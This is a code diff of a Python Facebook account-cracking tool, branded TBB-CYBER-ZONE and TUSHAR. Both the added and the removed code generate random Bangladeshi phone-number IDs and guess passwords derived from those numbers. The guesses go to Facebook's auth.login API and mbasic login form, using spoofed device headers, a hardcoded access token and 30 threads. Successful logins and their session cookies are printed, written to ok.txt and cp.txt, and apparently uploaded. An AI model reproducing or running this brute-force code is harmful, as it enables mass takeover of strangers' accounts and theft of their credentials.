+			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
+			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
+			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
+		])
+		sys.stdout.write(
+			"\r\r %s[>_] [TBBCYBER_OLD] : %s/%s -> \033[0;92m [ TBBCYBER-OK:%s ]- \033[0;91m[R4H4D-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+		); sys.stdout.flush()
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": ua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			if "session_key" in response.text and "EAAA" in response.text:
+				print("\r \033[0;92m[TUSHAR-OK] %s|%s\033[0;97m         "%(uid, pw))
+				self.ok.append("%s|%s"%(uid, pw))
+				open("ok.txt","a").write(" [TUSHAR-OK] %s|%s\n"%(uid, pw))
+				uploadoks()
+				break
+			elif "www.facebook.com" in response.json()["error_msg"]:
+				print("\r \033[0;91m[TUSHAR-CP] %s|%s\033[0;97m         "%(uid, pw))
+				self.cp.append("%s|%s"%(uid, pw))
+				open("cp.txt","a").write(" [TUSHAR-CP] %s|%s\n"%(uid, pw))
+				uploadcps()
+				break
+			else:
+				continue
+
+		self.loop +=1
+
+if len(sys.argv) == 2:
+	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
+		helpnote()
+	else:
+		Main()
+
+try:Main()
+except Exception as e:exit(str(e))
 
-    def __init__(self):
-
-        self.id = []
-
-        self.ok = []
-
-        self.cp = []
-
-        self.loop = 0
-
-        os.system("clear")
-
-        print(logo)        
-
-        print(" [01] RANDOM  NUMBER CLONE \033[1;34m")
-
-        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m")
-
-        print(" [00] Exit")        
-
-        Alif =input(" [?] Choose : ")
-
-        os.system('xdg-open https://m.facebook.com/groups/547086573624546/?ref=share&mibextid=NSMWBT')
-
-        if Alif in ["1", "01"]:
-
-            num()
-
-        if Alif in ["2","02"]:
-
-            os.system('xdg-open https://www.facebook.com/rafi.sarker.9085?mibextid=ZbWKwL')
-
-        if Alif in [" 0", "00"]:
-
-            exit()
-
-        else:
-
-            exit()
-
-def num():
-
-    user=[]
-
-    os.system('clear')
-
-    print(logo)
-
-    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
-
-    
-
-    kode = input(' [?] Enter sim code: ')
-
-    kodex = ''.join(random.choice(string.digits) for _ in range(2))
-
-    kod = ''.join(random.choice(string.digits) for _ in range(2))
-
-    os.system('clear')
-
-    print(logo)
-
-    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
-
-   
-
-    limit = int(input(' [?] Crack Your Limit : '))
-
-    for nmbr in range(limit):
-
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
-
-        user.append(nmp)
-
-    with ThreadPool(max_workers=30) as noob:
-
-        os.system('clear')
-
-        print(logo)     
-
-        tl = str(len(user))
-
-        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
-
-        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
-
-        print(' \033[1;97m[+] Process has been started🤞')
-
-        print(' \033[1;97m[+] Wait [🧐] for ids 🥰  ')
-
-        print(' \033[1;97m[+] Use Flight [✈️] mode for speed up ')
-
-        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
-
-        for guru in user:
-
-            uid = kode+kodex+kod+guru
-
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
-
-            noob.submit(rcrack1,uid,pwx,tl)
-
-    print(' [+] Crack process has been completed')
-
-    print(' [+] Ids saved in ok.txt,cp.txt')
-
-
-
-def rcrack1(uid,pwx,tl):
-
-    global loop
-
-    global cps
-
-    global oks
-
-    global proxy
-
-    try:
-
-        for ps in pwx:
-
-            pro = random.choice(ugen)
-
-            session = requests.Session()
-
-            sys.stdout.write('\r[\033[1;92mTBB-CYBER-ZONE\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
-
-            sys.stdout.flush()
-
-            free_fb = session.get('https://mbasic.facebook.com').text
-
-            log_data = {
-
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-
-            "try_number":"0",
-
-            "unrecognized_tries":"0",
-
-            "email":uid,
-
-            "pass":ps,
-
-            "login":"Log In"}
-
-            header_freefb = {'authority': 'mbasic.facebook.com',
-
-            'method':'POST',
-
-            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
-
-            'scheme':'https',
-
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-
-            'accept-language': 'en-US,en;q=0.9',
-
-            'cache-control': 'max-age=0',
-
-            'referer': 'https://mbasic.facebook.com/',
-
-            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-
-            'sec-ch-ua-mobile': '?0',
-
-            'sec-ch-ua-platform': '"Linux"',
-
-            'sec-fetch-dest': 'document',
-
-            'sec-fetch-mode': 'navigate',
-
-            'sec-fetch-site': 'same-origin',
-
-            'sec-fetch-user': '?1',
-
-            'upgrade-insecure-requests': '1',
-
-            'user-agent': pro }
-
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
-
-            log_cookies=session.cookies.get_dict().keys()
-
-            if 'c_user' in log_cookies:
-
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-
-                cid = coki[7:22]
-
-                print(f"\033[38;5;46m[TBB-CYBER-ZONE-OK💉] {uid} | {ps}")
-
-                print(f" Cookie : {coki}")
-
-                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
-
-                oks.append(uid)
-
-                break
-
-            elif 'checkpoint' in log_cookies:
-
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-
-                cid = coki[82:97]
-
-                print(f"\x1b[38;5;196m[TBB-CYBER-ZONE-CP🥴] {uid}|{ps}")
-
-                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
-
-                cps.append(uid)
-
-                break
-
-            else:
-
-                continue
-
-        loop+=1
-
-        sys.stdout.write(f'\r\033[m[TBB-CYBER-ZONE👑] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
-
-        sys.stdout.flush()
-
-    except:
-
-        pass
-
-Main()
